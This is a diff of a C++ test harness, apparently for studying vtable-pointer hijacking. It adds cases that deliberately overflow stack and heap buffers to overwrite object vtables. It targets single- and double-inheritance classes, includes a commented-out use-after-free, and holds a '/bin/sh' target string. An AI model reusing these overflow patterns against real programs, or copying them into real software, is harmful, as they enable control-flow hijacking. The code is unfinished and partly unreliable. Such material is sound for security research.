@@ -1,23 +1,32 @@
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
+#include <inttypes.h>
 #include <malloc.h>
 #include <iostream>
 
 using namespace std;
 
+void* destination = NULL;
+char* attackString = "/bin/sh";
+
+
 class ParentOne
 {
     public:
         void* buffer[3];
-        virtual void doSomething(char *string);
+        virtual void doSomething(char *string){
+
+        }
 };
 
 class ParentTwo
 {
     public:
         
-        virtual void foo(char *string);
+        virtual void foo(char *string){
+
+        }
 };
 
 class Child1:public ParentOne
@@ -68,20 +77,20 @@ class DoubleInherit1:public ParentOne, public ParentTwo
             cout << "DoubleInherit1!!!\nInput string: \"" << string << "\"" << endl;
         }
         void indirectOverwrite() {
-            void** writeTo
+            void** writeTo;
             void* writeThis;
             void* _buffer[3];
             
             // todo could be infinite
             for (int i = 0; ; ++i)  // overflow the destination+source
             {
-                (void*)*(_buffer + i) = (void*)destination;
+                *(_buffer + i) = (void*)destination;
                 if ((void*)(_buffer + i) == (void*)&writeTo)
                 {
-                    uint64_t vPTRlocation = *this;
+                    uint64_t vPTRlocation = *(uint64_t*)this;
                     vPTRlocation += sizeof(void*)*4;
 
-                    (void*)*(_buffer + i) = (void*)vPTRlocation;
+                    *(_buffer + i) = (void*)vPTRlocation;
                     break;
                 }
             }
@@ -115,7 +124,7 @@ class SyscallParent
         }
 };
 
-class SyscallParent: public SyscallParent
+class SyscallChild: public SyscallParent
 {
     public:
         virtual void doSyscall(char *string)
@@ -142,34 +151,32 @@ sys:
 
 int main(int argc, char const *argv[])
 {
-    char* attackString = "sh";
-    void* destination = NULL;
 
-    switch (argv[1]) {  //todo fix
+    switch (atoi(argv[1])) {  //todo fix
 
-        case start of good vable point to good inheritance func: 
-        case middle of good vable point to good inheritance func: 
+        case 1:  // start of good vable point to good inheritance func: 
+        case 2:  // middle of good vable point to good inheritance func: 
 
-        case start of good vable point to bad inheritance func:
-        case middle of good vable point to bad inheritance func:
+        case 3:  // start of good vable point to bad inheritance func:
+        case 4:  // middle of good vable point to bad inheritance func:
         
 
-        case crafted vable point to bad inheritance func:
-        case crafted vable point to good inheritance func:  // order can be different
+        case 5:  // crafted vable point to bad inheritance func:
+        case 6:  // crafted vable point to good inheritance func:  // order can be different
 
-        case crafted vable nonClassFunc:
-        case crafted vable middle of nonClassFunc:
+        case 7:  // crafted vable nonClassFunc:
+        case 8:  // crafted vable middle of nonClassFunc:
         // todo shellcode
         // todo existing code double reference
 
-        more options for double inherit**************************************************8
-        e.g. start of first vtable
+        // more options for double inherit**************************************************8
+        // e.g. start of first vtable
         default: break;
     }
 
 
-    switch (argv[1]) {  //todo fix
-        case stack+SingleInherit+sequentialOverFlow:
+    switch (atoi(argv[2])) {  //todo fix
+        case 0:  //stack+SingleInherit+sequentialOverFlow:
         {
             SingleInherit1 singleObj;
             void* buffer[3];
@@ -179,7 +186,7 @@ int main(int argc, char const *argv[])
             // todo could be infinite
             for (int i = 0; ; ++i)  // overflow
             {
-                (void*)*(buffer + i) = (void*)destination;
+                *(buffer + i) = (void*)destination;
                 if ((void*)(buffer + i) == (void*)object)
                     break;
             }
@@ -189,16 +196,16 @@ int main(int argc, char const *argv[])
             break;
         }
 
-        case heap+SingleInherit+sequentialOverFlow:
+        case 1:  // heap+SingleInherit+sequentialOverFlow:
         {
-            void* buffer[3] = malloc(sizeof(void*)*3);
+            void** buffer = (void **)malloc(sizeof(void*)*3);
 
             ParentOne* object = new SingleInherit1();
 
             // todo could be infinite
             for (int i = 0; ; ++i)  // overflow
             {
-                (void*)*(buffer + i) = (void*)destination;
+                *(buffer + i) = (void*)destination;
                 if ((void*)(buffer + i) == (void*)object)
                     break;
             }
@@ -209,11 +216,11 @@ int main(int argc, char const *argv[])
             break;
         }
 
-        case stack+SingleInherit+indirectOverwrite:
+        case 2:  // stack+SingleInherit+indirectOverwrite:
         {
             SingleInherit1 singleObj;
 
-            void** writeTo
+            void** writeTo;
             void* writeThis;
             void* buffer[3];
             
@@ -222,10 +229,10 @@ int main(int argc, char const *argv[])
             // todo could be infinite
             for (int i = 0; ; ++i)  // overflow the destination+source
             {
-                (void*)*(buffer + i) = (void*)destination;
+                *(buffer + i) = (void*)destination;
                 if ((void*)(buffer + i) == (void*)&writeTo)
                 {
-                    (void*)*(buffer + i) = (void*)object;
+                    *(buffer + i) = (void*)object;
                     break;
                 }
             }
@@ -236,21 +243,21 @@ int main(int argc, char const *argv[])
             break;
         }
 
-        case heap+SingleInherit+indirectOverwrite:
+        case 3:  // heap+SingleInherit+indirectOverwrite:
         {
             ParentOne* object = new SingleInherit1();
 
-            void** writeTo
+            void** writeTo;
             void* writeThis;
             void* buffer[3];
 
             // todo could be infinite
             for (int i = 0; ; ++i)  // overflow the destination+source
             {
-                (void*)*(buffer + i) = (void*)destination;
+                *(buffer + i) = (void*)destination;
                 if ((void*)(buffer + i) == (void*)&writeTo)
                 {
-                    (void*)*(buffer + i) = (void*)object;
+                    *(buffer + i) = (void*)object;
                     break;
                 }
             }
@@ -262,7 +269,7 @@ int main(int argc, char const *argv[])
         }
 
 //////////////////////////double
-        case stack+DoubleInherit+withinObjectOverFlow:
+        case 4:  // stack+DoubleInherit+withinObjectOverFlow:
         {
             DoubleInherit1 doubleObj;
 
@@ -277,7 +284,7 @@ int main(int argc, char const *argv[])
             break;
         }
 
-        case heap+DoubleInherit+withinObjectOverFlow:
+        case 5:  // heap+DoubleInherit+withinObjectOverFlow:
         {
             DoubleInherit1* object = new DoubleInherit1();
 
@@ -290,7 +297,7 @@ int main(int argc, char const *argv[])
             break;
         }
 
-        case stack+DoubleInherit+INdirectOverwrite:
+        case 6:  // stack+DoubleInherit+INdirectOverwrite:
         {
             DoubleInherit1 doubleObj;
 
@@ -302,7 +309,7 @@ int main(int argc, char const *argv[])
             break;
         }
 
-        case heap+DoubleInherit+INdirectOverwrite:
+        case 7:  // heap+DoubleInherit+INdirectOverwrite:
         {
 
             DoubleInherit1* object = new DoubleInherit1();
@@ -324,16 +331,16 @@ int main(int argc, char const *argv[])
 
 
 
-    ******************uaf
-	Child1* c1 = new Child1();
+ //    ******************uaf
+	// Child1* c1 = new Child1();
 
-	c1 -> doSomething("sh");
+	// c1 -> doSomething("sh");
 
-	free(c1);
+	// free(c1);
 
-	new Child2();
+	// new Child2();
 
-	c1 -> doSomething("sh");
+	// c1 -> doSomething("sh");
 }
 
 
